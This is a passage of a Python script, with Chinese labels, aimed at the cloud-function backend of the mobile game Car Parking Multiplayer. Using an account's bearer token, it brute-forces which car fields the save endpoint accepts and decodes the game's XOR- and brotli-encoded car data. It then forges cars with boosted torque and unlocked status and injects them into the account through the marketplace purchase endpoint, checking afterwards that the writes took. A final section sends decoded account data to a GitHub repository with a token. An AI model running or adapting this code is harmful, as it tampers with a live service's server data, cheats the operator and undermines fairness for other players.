                    report.append('--- (13) 字段白名单爆破（逐字段单写测试）---')
                    try:
                        _c13 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                        _v13 = _c13.get('result') if isinstance(_c13, dict) else None
                        for _u in range(2):
                            if isinstance(_v13, str):
                                try:
                                    _v13 = json.loads(_v13)
                                except Exception:
                                    break
                        _cars13 = [c for c in _v13 if isinstance(c, dict) and c.get('texts')] if isinstance(_v13, list) else []
                        _don13 = None
                        _rec13 = None
                        if len(_cars13) >= 2:
                            _rec13 = _cars13[0]
                            for _cc in _cars13[1:]:
                                if json.dumps(_cc.get('floats'), ensure_ascii=False) != json.dumps(_rec13.get('floats'), ensure_ascii=False):
                                    _don13 = _cc
                                    break
                            if _don13 is None:
                                _don13 = _cars13[1]
                        if not _don13 or not _rec13:
                            report.append('  车辆不足，无法测试')
                        else:
                            _t13 = _rec13.get('texts')
                            _key13 = str(_t13[2]) if isinstance(_t13, list) and len(_t13) >= 3 else ''
                            _flds13 = ['floats', 'vectors', 'gears', 'typeToInstall', 'BoughtParts', 'Vynils', 'WindowVinyls', 'fsoData', 'installedPoliceLights']
                            _sub13 = ''
                            if not _want('13'):
                                _a13 = _want('13a')
                                _b13 = _want('13b')
                                if _a13 and not _b13:
                                    _sub13 = 'a'
                                elif _b13 and not _a13:
                                    _sub13 = 'b'
                            if _sub13 == 'a':
                                _flds13 = _flds13[:4]
                            elif _sub13 == 'b':
                                _flds13 = _flds13[4:]
                            report.append('  受体车key=%s 施主车CarID=%s' % (_key13[:30], str(_don13.get('CarID'))))
                            _pend13 = []
                            for _fk13 in _flds13:
                                _nv13 = _don13.get(_fk13)
                                _ov13 = _rec13.get(_fk13)
                                if _nv13 is None:
                                    report.append('  %-20s : 施主无值，跳过' % _fk13)
                                    continue
                                if json.dumps(_nv13, ensure_ascii=False, sort_keys=True) == json.dumps(_ov13, ensure_ascii=False, sort_keys=True):
                                    report.append('  %-20s : 两车相同，跳过' % _fk13)
                                    continue
                                _m13 = json.loads(json.dumps(_rec13, ensure_ascii=False))
                                _m13[_fk13] = _nv13
                                _p13 = json.dumps(_m13, ensure_ascii=False)
                                _okw = False
                                try:
                                    _w13 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8', {'data': _p13}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                    _w13v = _w13.get('result') if isinstance(_w13, dict) else None
                                    _okw = (str(_w13v) == '1')
                                except Exception:
                                    _okw = False
                                time.sleep(0.4)
                                _pend13.append((_fk13, _nv13, _okw))
                            if _pend13:
                                _rec13n = None
                                try:
                                    time.sleep(0.6)
                                    _c13b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _v13b = _c13b.get('result') if isinstance(_c13b, dict) else None
                                    for _u in range(2):
                                        if isinstance(_v13b, str):
                                            try:
                                                _v13b = json.loads(_v13b)
                                            except Exception:
                                                break
                                    if isinstance(_v13b, list):
                                        for _ccb in _v13b:
                                            if isinstance(_ccb, dict):
                                                _tb = _ccb.get('texts')
                                                if isinstance(_tb, list) and len(_tb) >= 3 and str(_tb[2]) == _key13:
                                                    _rec13n = _ccb
                                                    break
                                except Exception:
                                    _rec13n = None
                                for (_fk13, _nv13, _okw) in _pend13:
                                    if _rec13n is None:
                                        report.append('  %-20s : 提交=%s 回读=读取失败' % (_fk13, 'OK' if _okw else 'FAIL'))
                                    else:
                                        _nowv = _rec13n.get(_fk13)
                                        _vok = (json.dumps(_nowv, ensure_ascii=False, sort_keys=True) == json.dumps(_nv13, ensure_ascii=False, sort_keys=True))
                                        report.append('  %-20s : 提交=%s 回读=%s' % (_fk13, 'OK' if _okw else 'FAIL', 'CHANGED' if _vok else 'UNCHANGED'))
                    except Exception as _e13:
                        report.append('  [13] 外层 %s' % str(_e13)[:110])
                if _want('6'):
                    report.append('--- (6) 版本变体读探测 ---')
                    try:
                        for _fn6 in ['WSGetCarListV2', 'WSGetCarListV1', 'WSGetFullCarV2', 'WSGetFullCarV1',
                                     'WSGetCarIDnStatusV2', 'WSGetCarIDnStatusV1', 'SendAllCars2']:
                            try:
                                _r6 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/' + _fn6, {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=10)
                                _s6 = json.dumps(_r6, ensure_ascii=False)[:150] if isinstance(_r6, dict) else str(_r6)[:150]
                                report.append('  [%s] -> %s' % (_fn6, _s6))
                            except Exception as _e6:
                                report.append('  [%s] -> ERR %s' % (_fn6, str(_e6)[:80]))
                    except Exception as _e62:
                        report.append('  [6] 外层 %s' % str(_e62)[:80])
                if _want('dec'):
                    report.append('--- (14) 数据解码探针（只读）---')
                    try:
                        _d14 = None
                        if _aes_body is not None:
                            _r14 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d14 = _r14.get('result') if isinstance(_r14, dict) else None
                            for _u in range(2):
                                if isinstance(_d14, str):
                                    try:
                                        _d14 = json.loads(_d14)
                                    except Exception:
                                        break
                        if not isinstance(_d14, list):
                            report.append('  拉取失败: %s' % str(_d14)[:80])
                        else:
                            _dc14 = [x for x in _d14 if isinstance(x, dict) and x.get('texts')]
                            report.append('  样本车数: %d' % len(_dc14))
                            for _ci14 in range(min(2, len(_dc14))):
                                _car14 = _dc14[_ci14]
                                _t14 = _car14.get('texts')
                                _k14 = ''
                                try:
                                    _k14 = str(_t14[2]) if isinstance(_t14, list) and len(_t14) >= 3 else ''
                                except Exception:
                                    pass
                                report.append('  ===车%d CarID=%s key=%s dataVersion=%r' % (_ci14 + 1, str(_car14.get('CarID')), _k14[:40], _car14.get('dataVersion')))
                                for _f14 in ['vectors', 'floats', 'Vynils', 'WindowVinyls', 'gears', 'typeToInstall', 'BoughtParts', 'fsoData']:
                                    _v14 = _car14.get(_f14)
                                    if _v14 is None:
                                        report.append('    [%s] None' % _f14)
                                        continue
                                    _ln14 = len(_v14) if isinstance(_v14, (list, str)) else 0
                                    _sn14 = json.dumps(_v14, ensure_ascii=False)[:80]
                                    report.append('    [%s] %s len=%d: %s' % (_f14, type(_v14).__name__, _ln14, _sn14))
                                    _b64_14 = None
                                    if isinstance(_v14, str) and len(_v14) > 8:
                                        _b64_14 = _v14.strip()
                                    elif isinstance(_v14, list) and _v14 and all(isinstance(_x, str) and len(_x) <= 2 for _x in _v14[:60]):
                                        _b64_14 = ''.join(_v14)
                                    if not _b64_14:
                                        continue
                                    try:
                                        _raw14 = base64.b64decode(_b64_14 + '=' * ((4 - len(_b64_14) % 4) % 4))
                                        _out14 = brotli_decompress(_raw14)
                                        if _out14:
                                            report.append('      brotli OK len=%d preview=%s' % (len(_out14), repr(_out14[:140])[:170]))
                                        else:
                                            _x14 = xor_bytes(_raw14, derive_key(c.uid or ''))
                                            _out14b = brotli_decompress(_x14)
                                            if _out14b:
                                                report.append('      XOR+brotli OK len=%d preview=%s' % (len(_out14b), repr(_out14b[:140])[:170]))
                                            else:
                                                report.append('      decode FAIL rawlen=%d head=%s' % (len(_raw14), _raw14[:16].hex()))
                                    except Exception as _de14:
                                        report.append('      decode ERR %s' % str(_de14)[:80])
                    except Exception as _e14:
                        report.append('  [14] 外层 %s' % str(_e14)[:120])
                if _want('wr'):
                    report.append('--- (15) 明文格式写入测试（会改数据）---')
                    try:
                        _d15 = None
                        if _aes_body is not None:
                            _r15 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d15 = _r15.get('result') if isinstance(_r15, dict) else None
                            for _u in range(2):
                                if isinstance(_d15, str):
                                    try:
                                        _d15 = json.loads(_d15)
                                    except Exception:
                                        break
                        if not isinstance(_d15, list):
                            report.append('  拉取失败')
                        else:
                            _dc15 = [x for x in _d15 if isinstance(x, dict) and x.get('texts')]
                            if not _dc15:
                                report.append('  无可用车')
                            else:
                                _car15 = _dc15[0]
                                _cid15 = str(_car15.get('CarID'))
                                _txt15 = _car15.get('texts') or ['', '', '']
                                _key15 = str(_txt15[2]) if len(_txt15) >= 3 else ''
                                report.append('  目标车 CarID=%s key=%s' % (_cid15, _key15[:40]))
                                report.append('  [原值] dataVersion=%r' % (_car15.get('dataVersion'),))
                                report.append('  [原值] vectors=%s' % json.dumps(_car15.get('vectors'), ensure_ascii=False)[:70])
                                report.append('  [原值] floats=%s' % json.dumps(_car15.get('floats'), ensure_ascii=False)[:70])
                                report.append('  [原值] Vynils=%s' % json.dumps(_car15.get('Vynils'), ensure_ascii=False)[:70])

                                def _send15(_mut):
                                    _m15 = json.loads(json.dumps(_car15, ensure_ascii=False))
                                    _mut(_m15)
                                    _w15 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8', {'data': json.dumps(_m15, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                    _s15 = json.dumps(_w15, ensure_ascii=False)[:80] if isinstance(_w15, dict) else str(_w15)[:80]
                                    time.sleep(0.8)
                                    _c15 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _l15 = _c15.get('result') if isinstance(_c15, dict) else None
                                    for _u in range(2):
                                        if isinstance(_l15, str):
                                            try:
                                                _l15 = json.loads(_l15)
                                            except Exception:
                                                break
                                    _now15 = None
                                    if isinstance(_l15, list):
                                        for _cc in _l15:
                                            if isinstance(_cc, dict) and str(_cc.get('CarID')) == _cid15 and (_cc.get('texts') or None) == (_car15.get('texts') or None):
                                                _now15 = _cc
                                                break
                                    return _s15, _now15

                                _s15, _n15 = _send15(lambda m: m.__setitem__('dataVersion', 2))
                                report.append('  [T1 dataVersion→2] %s | 回读: %r' % (_s15, (_n15 or {}).get('dataVersion')))
                                _s15, _n15 = _send15(lambda m: m.__setitem__('vectors', [{'x': 0.11, 'y': 0.22, 'z': 0.33}]))
                                report.append('  [T2 vectors→明文1项] %s | 回读: %s' % (_s15, json.dumps((_n15 or {}).get('vectors'), ensure_ascii=False)[:90]))
                                _s15, _n15 = _send15(lambda m: m.__setitem__('floats', [0.55] * 55))
                                report.append('  [T3 floats→明文55项] %s | 回读: %s' % (_s15, json.dumps((_n15 or {}).get('floats'), ensure_ascii=False)[:90]))
                                _s15, _n15 = _send15(lambda m: m.__setitem__('Vynils', {'allVynils': [], 'CarID': int(_cid15) if _cid15.isdigit() else 0}))
                                report.append('  [T4 Vynils→明文空] %s | 回读: %s' % (_s15, json.dumps((_n15 or {}).get('Vynils'), ensure_ascii=False)[:90]))
                    except Exception as _e15:
                        report.append('  [15] 外层 %s' % str(_e15)[:120])
                if _want('inj'):
                    report.append('--- (16) 明文车注入测试 ---')
                    try:
                        _d16 = None
                        if _aes_body is not None:
                            _r16 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d16 = _r16.get('result') if isinstance(_r16, dict) else None
                            for _u in range(2):
                                if isinstance(_d16, str):
                                    try:
                                        _d16 = json.loads(_d16)
                                    except Exception:
                                        break
                        _dc16 = [x for x in _d16 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d16, list) else []
                        if not _dc16:
                            report.append('  无可用模板车')
                        else:
                            _car16 = _dc16[0]
                            _cid16 = int(_car16.get('CarID') or 0)
                            _uid8_16 = (_uidv or '')[:8].upper()
                            _inst16 = '%s_%d_TST' % (_uid8_16, _cid16)
                            _new16 = json.loads(json.dumps(_car16, ensure_ascii=False))
                            _new16['engineID'] = 5
                            _new16['cdi'] = True
                            _new16['isLocked'] = False
                            _new16['torque'] = 3000.0
                            _new16['brake'] = 3000.0
                            _new16['mass'] = 1100.0
                            _new16['texts'] = ['', '', _inst16]
                            _new16['vectors'] = [{'x': 0.11, 'y': 0.22, 'z': 0.33}]
                            _new16['floats'] = [0.55] * 55
                            _new16['gears'] = [3.2, 1.91, 1.53, 1.27, 0.9, 0.6, 0.45, 5.0]
                            _new16['typeToInstall'] = [-2] * 8
                            _new16['BoughtParts'] = [0] * 71
                            _new16['fsoData'] = [0] * 8
                            _new16['Vynils'] = {'allVynils': [], 'CarID': _cid16}
                            _new16['WindowVinyls'] = []
                            _new16['dataVersion'] = 2
                            report.append('  模板车 CarID=%d 实例名=%s（明文构造）' % (_cid16, _inst16))
                            _sr16 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                            _sv16 = _sr16.get('result') if isinstance(_sr16, dict) else None
                            for _u in range(2):
                                if isinstance(_sv16, str):
                                    try:
                                        _sv16 = json.loads(_sv16)
                                    except Exception:
                                        break
                            _slot16 = None
                            if isinstance(_sv16, list):
                                for _sl16 in _sv16:
                                    if isinstance(_sl16, dict) and int(_sl16.get('carID') or 0) == 0:
                                        _slot16 = _sl16
                                        break
                                if _slot16 is None and _sv16:
                                    _slot16 = _sv16[0]
                            if not isinstance(_slot16, dict):
                                report.append('  无可用车市槽位')
                            else:
                                _pay16 = {
                                    'ownerID': _slot16.get('ownerID', ''),
                                    'ownerName': _slot16.get('ownerName', ''),
                                    'description': _slot16.get('description', ''),
                                    'CarID': _slot16.get('carID', 0),
                                    'carGeneratedID': _slot16.get('carGeneratedID', ''),
                                    'ownerAccountID': _slot16.get('ownerAccountID', ''),
                                    'oneCar': _new16,
                                    'vynilOneCar': _new16.get('Vynils', {}),
                                    'loadedLocalCar': {'instanceID': -200000},
                                    'price': _slot16.get('price', 100),
                                    'SellingCar': {},
                                    'willReject': False,
                                    'dislike': 1,
                                    'like': 0,
                                    'liked': False,
                                    'disliked': False,
                                    'mode': 1,
                                }
                                _pr16 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3', {'data': json.dumps(_pay16, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=40)
                                _ps16 = json.dumps(_pr16, ensure_ascii=False)[:120] if isinstance(_pr16, dict) else str(_pr16)[:120]
                                report.append('  注入响应: %s' % _ps16)
                                time.sleep(1.2)
                                _r16b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                _v16b = _r16b.get('result') if isinstance(_r16b, dict) else None
                                for _u in range(2):
                                    if isinstance(_v16b, str):
                                        try:
                                            _v16b = json.loads(_v16b)
                                        except Exception:
                                            break
                                _f16 = None
                                if isinstance(_v16b, list):
                                    for _c16 in _v16b:
                                        _t16 = _c16.get('texts') if isinstance(_c16, dict) else None
                                        if isinstance(_t16, list):
                                            for _tt16 in _t16:
                                                if str(_tt16) == _inst16:
                                                    _f16 = _c16
                                                    break
                                        if _f16 is not None:
                                            break
                                if _f16 is None:
                                    report.append('  回读: 未找到新车（注入可能被拒/过滤）')
                                else:
                                    report.append('  回读: 新车已入库！CarID=%s' % str(_f16.get('CarID')))
                                    report.append('    dataVersion -> %s' % json.dumps(_f16.get('dataVersion'), ensure_ascii=False)[:60])
                                    report.append('    vectors -> %s' % json.dumps(_f16.get('vectors'), ensure_ascii=False)[:110])
                                    report.append('    floats -> %s' % json.dumps(_f16.get('floats'), ensure_ascii=False)[:110])
                                    report.append('    gears -> %s' % json.dumps(_f16.get('gears'), ensure_ascii=False)[:110])
                                    report.append('    Vynils -> %s' % json.dumps(_f16.get('Vynils'), ensure_ascii=False)[:110])
                    except Exception as _e16:
                        report.append('  [16] 外层 %s' % str(_e16)[:120])
                if _want('bin'):
                    report.append('--- (17) 二进制结构分析 ---')
                    try:
                        _d17 = None
                        if _aes_body is not None:
                            _r17 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d17 = _r17.get('result') if isinstance(_r17, dict) else None
                            for _u in range(2):
                                if isinstance(_d17, str):
                                    try:
                                        _d17 = json.loads(_d17)
                                    except Exception:
                                        break
                        _dc17 = [x for x in _d17 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d17, list) else []
                        if not _dc17:
                            report.append('  无可用车')
                        else:
                            _car17 = _dc17[0]
                            report.append('  目标车 CarID=%s' % str(_car17.get('CarID')))
                            for _f17 in ['vectors', 'floats', 'gears', 'typeToInstall', 'BoughtParts', 'fsoData', 'Vynils', 'WindowVinyls']:
                                _v17 = _car17.get(_f17)
                                if _v17 is None:
                                    report.append('  [%s] None' % _f17)
                                    continue
                                _b6417 = None
                                if isinstance(_v17, str) and len(_v17) > 8:
                                    _b6417 = _v17.strip()
                                elif isinstance(_v17, list) and _v17 and all(isinstance(_x, str) and len(_x) <= 2 for _x in _v17[:80]):
                                    _b6417 = ''.join(_v17)
                                if not _b6417:
                                    report.append('  [%s] %s（非编码态，跳过）' % (_f17, type(_v17).__name__))
                                    continue
                                _raw17 = base64.b64decode(_b6417 + '=' * ((4 - len(_b6417) % 4) % 4))
                                _out17 = brotli_decompress(_raw17)
                                if not _out17:
                                    _out17 = brotli_decompress(xor_bytes(_raw17, derive_key(c.uid or '')))
                                if not _out17:
                                    report.append('  [%s] 解码失败（len=%d）' % (_f17, len(_raw17)))
                                    continue
                                _L17 = len(_out17)
                                report.append('  [%s] 解码=%dB head=%s' % (_f17, _L17, _out17[:20].hex()))
                                if _L17 >= 4:
                                    _u017 = struct.unpack('<I', _out17[:4])[0]
                                    _a12 = str((_L17 - 4) // 12) if (_L17 - 4) % 12 == 0 else '-'
                                    _a4 = str((_L17 - 4) // 4) if (_L17 - 4) % 4 == 0 else '-'
                                    report.append('    头u32=%d | 12对齐=%s | 4对齐=%s' % (_u017, _a12, _a4))
                                if _L17 >= 8:
                                    _n4_17 = min((_L17 - 4) // 4, 8)
                                    if _n4_17 >= 1:
                                        try:
                                            _v4_17 = struct.unpack('<%df' % _n4_17, _out17[4:4 + 4 * _n4_17])
                                            report.append('    f32[0:8]=%s' % ', '.join('%.3f' % _x for _x in _v4_17))
                                        except Exception:
                                            pass
                                    _n3_17 = min((_L17 - 4) // 12, 5)
                                    if _n3_17 >= 1:
                                        try:
                                            _v3_17 = []
                                            for _i3_17 in range(_n3_17):
                                                _x17, _y17, _z17 = struct.unpack('<fff', _out17[4 + _i3_17 * 12: 4 + _i3_17 * 12 + 12])
                                                _v3_17.append('(%.2f, %.2f, %.2f)' % (_x17, _y17, _z17))
                                            report.append('    f3xN[0:5]=%s' % ' '.join(_v3_17))
                                        except Exception:
                                            pass
                    except Exception as _e17:
                        report.append('  [17] 外层 %s' % str(_e17)[:120])
                if _want('tr9'):
                    report.append('--- (18) 转码注入测试 ---')
                    try:
                        _d18 = None
                        if _aes_body is not None:
                            _r18 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d18 = _r18.get('result') if isinstance(_r18, dict) else None
                            for _u in range(2):
                                if isinstance(_d18, str):
                                    try:
                                        _d18 = json.loads(_d18)
                                    except Exception:
                                        break
                        _dc18 = [x for x in _d18 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d18, list) else []
                        if not _dc18:
                            report.append('  无可用模板车')
                        else:
                            _car18 = _dc18[0]
                            _uid8_18 = (_uidv or '')[:8].upper()
                            _inst18 = '%s_%d_TR9' % (_uid8_18, int(_car18.get('CarID') or 0))

                            def _dec18(_v):
                                _b = None
                                if isinstance(_v, str) and len(_v) > 8:
                                    _b = _v.strip()
                                elif isinstance(_v, list) and _v and all(isinstance(_x, str) and len(_x) <= 2 for _x in _v[:80]):
                                    _b = ''.join(_v)
                                if not _b:
                                    return None
                                _r = base64.b64decode(_b + '=' * ((4 - len(_b) % 4) % 4))
                                _o = brotli_decompress(_r)
                                if not _o:
                                    _o = brotli_decompress(xor_bytes(_r, derive_key(c.uid or '')))
                                return _o

                            def _pf3(_o):
                                if not _o or len(_o) < 4:
                                    return None
                                _n = struct.unpack('<I', _o[:4])[0]
                                if len(_o) != 4 + 12 * _n:
                                    return None
                                _arr = []
                                for _i in range(_n):
                                    _x, _y, _z = struct.unpack('<fff', _o[4 + 12 * _i: 16 + 12 * _i])
                                    _arr.append({'x': round(_x, 4), 'y': round(_y, 4), 'z': round(_z, 4)})
                                return _arr

                            def _pf1(_o):
                                if not _o or len(_o) < 4:
                                    return None
                                _n = struct.unpack('<I', _o[:4])[0]
                                if len(_o) != 4 + 4 * _n:
                                    return None
                                return [round(float(_x), 4) for _x in struct.unpack('<%df' % _n, _o[4:])]

                            def _pi1(_o):
                                if not _o or len(_o) < 4:
                                    return None
                                _n = struct.unpack('<I', _o[:4])[0]
                                if len(_o) != 4 + 4 * _n:
                                    return None
                                return list(struct.unpack('<%di' % _n, _o[4:]))

                            _vect18 = _pf3(_dec18(_car18.get('vectors')))
                            _floa18 = _pf1(_dec18(_car18.get('floats')))
                            _gear18 = _pf1(_dec18(_car18.get('gears')))
                            _typ18 = _pi1(_dec18(_car18.get('typeToInstall')))
                            _bou18 = _pi1(_dec18(_car18.get('BoughtParts')))
                            _fso18 = _pi1(_dec18(_car18.get('fsoData')))
                            report.append('  [解析] vectors=%s' % (('OK %d项 前3=%s' % (len(_vect18), _vect18[:3])) if _vect18 else 'FAIL'))
                            report.append('  [解析] floats=%s' % (('OK %d项 前3=%s' % (len(_floa18), _floa18[:3])) if _floa18 else 'FAIL'))
                            report.append('  [解析] gears=%s' % (('OK %d项 前3=%s' % (len(_gear18), _gear18[:3])) if _gear18 else 'FAIL'))
                            report.append('  [解析] typeToInstall=%s' % (('OK %d项 前3=%s' % (len(_typ18), _typ18[:3])) if _typ18 else 'FAIL'))
                            report.append('  [解析] BoughtParts=%s' % (('OK %d项 前3=%s' % (len(_bou18), _bou18[:3])) if _bou18 else 'FAIL'))
                            report.append('  [解析] fsoData=%s' % (('OK %d项 前3=%s' % (len(_fso18), _fso18[:3])) if _fso18 else 'FAIL'))

                            _new18 = json.loads(json.dumps(_car18, ensure_ascii=False))
                            if _vect18:
                                _new18['vectors'] = _vect18
                            if _floa18:
                                _new18['floats'] = _floa18
                            if _gear18:
                                _new18['gears'] = _gear18
                            if _typ18:
                                _new18['typeToInstall'] = _typ18
                            if _bou18:
                                _new18['BoughtParts'] = _bou18
                            if _fso18:
                                _new18['fsoData'] = _fso18
                            _new18['engineID'] = 5
                            _new18['cdi'] = True
                            _new18['isLocked'] = False
                            _new18['torque'] = 3000.0
                            _new18['brake'] = 3000.0
                            _new18['mass'] = 1100.0
                            _new18['texts'] = ['', '', _inst18]
                            _new18['Vynils'] = {'allVynils': [], 'CarID': int(_car18.get('CarID') or 0)}
                            _new18['WindowVinyls'] = []
                            _new18['dataVersion'] = 2

                            _sr18 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                            _sv18 = _sr18.get('result') if isinstance(_sr18, dict) else None
                            for _u in range(2):
                                if isinstance(_sv18, str):
                                    try:
                                        _sv18 = json.loads(_sv18)
                                    except Exception:
                                        break
                            _slot18 = None
                            if isinstance(_sv18, list):
                                for _sl18 in _sv18:
                                    if isinstance(_sl18, dict) and int(_sl18.get('carID') or 0) == 0:
                                        _slot18 = _sl18
                                        break
                                if _slot18 is None and _sv18:
                                    _slot18 = _sv18[0]
                            if not isinstance(_slot18, dict):
                                report.append('  无可用车市槽位')
                            else:
                                _pay18 = {
                                    'ownerID': _slot18.get('ownerID', ''),
                                    'ownerName': _slot18.get('ownerName', ''),
                                    'description': _slot18.get('description', ''),
                                    'CarID': _slot18.get('carID', 0),
                                    'carGeneratedID': _slot18.get('carGeneratedID', ''),
                                    'ownerAccountID': _slot18.get('ownerAccountID', ''),
                                    'oneCar': _new18,
                                    'vynilOneCar': _new18.get('Vynils', {}),
                                    'loadedLocalCar': {'instanceID': -300000},
                                    'price': _slot18.get('price', 100),
                                    'SellingCar': {},
                                    'willReject': False,
                                    'dislike': 1,
                                    'like': 0,
                                    'liked': False,
                                    'disliked': False,
                                    'mode': 1,
                                }
                                _pr18 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3', {'data': json.dumps(_pay18, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=40)
                                _ps18 = json.dumps(_pr18, ensure_ascii=False)[:120] if isinstance(_pr18, dict) else str(_pr18)[:120]
                                report.append('  注入响应: %s' % _ps18)
                                time.sleep(1.2)
                                _r18b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                _v18b = _r18b.get('result') if isinstance(_r18b, dict) else None
                                for _u in range(2):
                                    if isinstance(_v18b, str):
                                        try:
                                            _v18b = json.loads(_v18b)
                                        except Exception:
                                            break
                                _f18 = None
                                if isinstance(_v18b, list):
                                    for _c18 in _v18b:
                                        _t18 = _c18.get('texts') if isinstance(_c18, dict) else None
                                        if isinstance(_t18, list):
                                            for _tt18 in _t18:
                                                if str(_tt18) == _inst18:
                                                    _f18 = _c18
                                                    break
                                        if _f18 is not None:
                                            break
                                if _f18 is None:
                                    report.append('  回读: 未找到新车（注入被拒/过滤）')
                                else:
                                    report.append('  回读: 新车已入库 CarID=%s' % str(_f18.get('CarID')))
                                    report.append('    vectors 前3 -> %s' % json.dumps((_f18.get('vectors') or [])[:3], ensure_ascii=False)[:150])
                                    report.append('    floats 前3 -> %s' % json.dumps((_f18.get('floats') or [])[:3], ensure_ascii=False)[:150])
                                    report.append('    gears 前3 -> %s' % json.dumps((_f18.get('gears') or [])[:3], ensure_ascii=False)[:150])
                                    report.append('    typeToInstall 前3 -> %s' % json.dumps((_f18.get('typeToInstall') or [])[:3], ensure_ascii=False)[:150])
                                    report.append('    BoughtParts 前3 -> %s' % json.dumps((_f18.get('BoughtParts') or [])[:3], ensure_ascii=False)[:150])
                                    report.append('    fsoData 前3 -> %s' % json.dumps((_f18.get('fsoData') or [])[:3], ensure_ascii=False)[:150])
                    except Exception as _e18:
                        report.append('  [18] 外层 %s' % str(_e18)[:120])
                if _want('stash'):
                    report.append('--- (19) 贴纸暂存 Vynils Stash ---')
                    try:
                        _d19 = None
                        if _aes_body is not None:
                            _r19 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d19 = _r19.get('result') if isinstance(_r19, dict) else None
                            for _u in range(2):
                                if isinstance(_d19, str):
                                    try:
                                        _d19 = json.loads(_d19)
                                    except Exception:
                                        break
                        _dc19 = [x for x in _d19 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d19, list) else []
                        if not _dc19:
                            report.append('  无可用模板车')
                        else:
                            _car19 = _dc19[0]
                            _uid8_19 = (_uidv or '')[:8].upper()
                            _vy19 = _car19.get('Vynils')
                            _wv19 = _car19.get('WindowVinyls')

                            def _kind19(_v):
                                if isinstance(_v, list) and _v and all(isinstance(_x, str) and len(_x) <= 2 for _x in _v[:80]):
                                    return 'encoded_arr'
                                if isinstance(_v, str):
                                    return 'encoded_str'
                                if isinstance(_v, (dict, list)):
                                    return 'plain'
                                return 'none'

                            def _b64_of19(_v):
                                _b = None
                                if isinstance(_v, str) and len(_v) > 8:
                                    _b = _v.strip()
                                elif isinstance(_v, list) and _v and all(isinstance(_x, str) and len(_x) <= 2 for _x in _v[:80]):
                                    _b = ''.join(_v)
                                if not _b:
                                    return None
                                try:
                                    _raw = base64.b64decode(_b + '=' * ((4 - len(_b) % 4) % 4))
                                    _out = brotli_decompress(_raw)
                                    if not _out:
                                        _out = brotli_decompress(xor_bytes(_raw, derive_key(c.uid or '')))
                                    if _out:
                                        return base64.b64encode(_out).decode('ascii')
                                except Exception:
                                    pass
                                return None

                            _k19v = _kind19(_vy19)
                            _k19w = _kind19(_wv19)
                            report.append('  账号=%s | 车key=%s' % (_uid8_19, str((_car19.get('texts') or ['', '', ''])[2])[:40]))
                            report.append('  Vynils: kind=%s size=%s' % (_k19v, len(_vy19) if isinstance(_vy19, (list, str, dict)) else 0))
                            report.append('  WindowVinyls: kind=%s size=%s' % (_k19w, len(_wv19) if isinstance(_wv19, (list, str, dict)) else 0))
                            _stash19 = {
                                'uid8': _uid8_19,
                                'ts': int(time.time()),
                                'carId': int(_car19.get('CarID') or 0),
                                'vynils_kind': _k19v,
                                'window_kind': _k19w,
                            }
                            try:
                                _stash19['vynils_raw'] = json.loads(json.dumps(_vy19, ensure_ascii=False))
                            except Exception:
                                _stash19['vynils_raw'] = None
                            try:
                                _stash19['window_raw'] = json.loads(json.dumps(_wv19, ensure_ascii=False))
                            except Exception:
                                _stash19['window_raw'] = None
                            _stash19['vynils_dec_b64'] = _b64_of19(_vy19)
                            _stash19['window_dec_b64'] = _b64_of19(_wv19)
                            _ok19 = '未同步'
                            if GH_TOKEN and GH_REPO:
                                try:
                                    _p19 = 'stash_vyn_%s.json' % _uid8_19
                                    _ustr19 = json.dumps(_stash19, ensure_ascii=False)
                                    _url19 = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, _p19)
                                    _sha19 = None
                                    try:
                                        _sha19 = _gh_http(_url19, 'GET').get('sha')
                                    except Exception:
                                        pass
